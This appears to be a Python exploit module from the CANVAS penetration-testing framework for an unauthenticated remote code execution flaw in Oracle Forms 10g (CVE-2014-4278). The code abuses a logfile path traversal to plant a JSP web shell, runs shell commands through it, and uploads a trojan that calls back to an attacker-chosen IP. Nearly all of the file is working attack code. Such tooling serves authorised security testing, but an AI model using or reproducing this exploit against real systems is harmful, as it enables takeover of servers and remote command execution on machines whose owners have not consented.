#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import time

# covers both angles
if "." not in sys.path: sys.path.append(".")

import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import *
from ExploitTypes.CommandLineExecuter import CommandExploit
from canvasexploit import *
from canvasengine import UNIVERSAL_MOSDEF


NAME                            = "Oracle Forms 10g Unauthenticated Remote Code Execution"
DESCRIPTION                     = "Poor input validation allows remote users to execute arbitrary commands on the remote Oracle Forms server."
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Oracle"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "CVE-2014-4278"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4278"
DOCUMENTATION["Info"]           = "https://securitytracker.com/id/1031042"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [["Linux"]]
PROPERTY['VERSION']             = ["All"]

NOTES                           = """
This vulnerability affects Oracle Forms 10g and it allows remote attackers to execute arbitrary code on the remote
Oracle server due to poor input validation on the logfile parameter on /forms/frmservlet.
In addition, a path traversal vulnerability exists, which allows us to place the log file outside of the expected location.
This combined with a weak configuration of the oracle server, allows us to serve .JSP files under /forms/java/ folder,
that makes possible the execution of arbitrary code on the server.

Tested on: "Oracle Development Suite 10.1.2.0.2 running on Fedora 10"

Also affected: Oracle E-Business Suite 12.0.6, 12.1.3, 12.2.2, 12.2.3 and 12.2.4.
"""

CHANGELOG                       = """
"""

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        self.port               = 8889
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.ssl                = ""
        self.name               = NAME

        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.mosdef_type        = "UNIVERSAL"
        self.mosdef_debug       = False
        self.http_ssl           = False
        self.supports_universal = True

        # self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""

        self.hostname           = None
        self.content_type       = ""

        self.target_params      = "ifcfs=/forms/frmservlet?acceptLanguage=en-US,en;q=0.5&ifcmd=getinfo&ifip=127.0.0.1,"
        self.base_url           = ""
        self.basepath           = "/forms/lservlet"

        self.ua = None

        self.upload_path        = "/forms/java/"
        self.fixed_upload_path  =  "../../"

        self.cmd_name     = randomstring(8) + ".jsp"
        # Name of blind shell with random string appended to avoid multiple executions of the same run.
        self.blind_webshell     = '<%25java.lang.Runtime.getRuntime().exec(request.getParameter("cmd").split(","))%3b%25>{}.jsp'.format(randomstring(4))
        self.final_path         = ""
        self.endpoint_up     = "is up and running"

        return


    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.getarg("hostname")
        if not self.hostname:
            self.hostname = self.host
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        #TODO: make this a parameter in the dialog?
        self.mosdef_debug       = self.argsDict.get("mosdef_debug", self.mosdef_debug)
        self.host               = self.target.interface
        self.port               = int(self.argsDict.get("port",self.port))
        self.basepath           = self.argsDict.get("basepath",self.basepath)
        self.ssl                = self.argsDict.get("ssl",self.ssl)


        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        self.base_url = protocol + "://" + self.hostname + ":" + str(self.port)

        self.ua = self.setup_UA()

        return

    def setup_UA(self):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.basicauth_user and self.basicauth_password:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            logging.info("Using BasicAuth (User: %s - Password: %s)" % (self.basicauth_user, self.basicauth_password))
        else:
            auth = None

        ua = spkproxy.UserAgent(self.base_url, auth=auth, hostname=self.hostname, exploit=self)

        #XXX: SETTING THE PROXY FOR TESTING. Do not use in release!
        #ua = spkproxy.UserAgent(self.base_url, auth=auth, hostname=self.hostname, exploit=self, proxyhost="localhost", proxyport=8080)
        return ua


    def test_endpoint(self):
        logging.info("Testing if endpoint is up...")

        (response, response_code) = self.ua.GET("/forms/lservlet",
                                                noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        if response_code == 200:
            if self.endpoint_up in response:
                logging.info("The endpoint seems to be up")
            else:
                logging.info("Got 200 but not expected response")
            return True
        else:
            logging.error("The endpoint seems to be down")
            return False


    def upload_initial_payload(self):
        logging.info("Trying to upload initial blind JSP shell...")

        (response, response_code) = self.ua.GET("/forms/lservlet?"+self.target_params+"./java/"+self.blind_webshell, # Replace ./java/ for bruteforced value
                                                noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        if response_code == 200:
            logging.info("Got 200!")
        else:
            logging.error("Something went wrong.")

    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()

    def run_blind_command(self, command):
        cmd = "%%20%s" % urlencode(command)
        params = "?cmd=/bin/sh,-c,%s" % cmd

        (response, response_code) = self.ua.GET(
            self.upload_path + self.blind_webshell + params,
            noresponse=False,
            entireresponse=True,
            return_response_code=True)

        return True



    def run(self):
        self.getargs()

        self.host = self.target.interface


        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))
        logging.info("Using version: %s" % self.version)


        if self.test_endpoint():
            self.setProgress(10)

            # Set callback
            self.getargs_cle()


            # Uploading blind shell
            self.upload_initial_payload()
            self.setProgress(40)

            # Waiting for the log to be generated
            time.sleep(1)

            # Get OS
            self.get_os()


            if self.target_os != "Unknown":
                logging.info("Found target OS: %s" % self.target_os)
            else:
                logging.error("Could not find target OS!")
                return 0

            # Upload and execute MOSDEF trojan
            self.upload_and_execute()
            self.setProgress(75)

            if self.ISucceeded():
                logging.warning("Module succeeded")
                self.setInfo("%s - done (success)" % (NAME))
                return 1
            else:
                logging.error('Module failed')
                self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
                return 0

        else:
            logging.critical("Unexpected response!")
            self.setInfo("Exploit failed!")

        self.setProgress(100)

        return 1 if not failed else 0

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 8889")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /forms/lservlet   [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)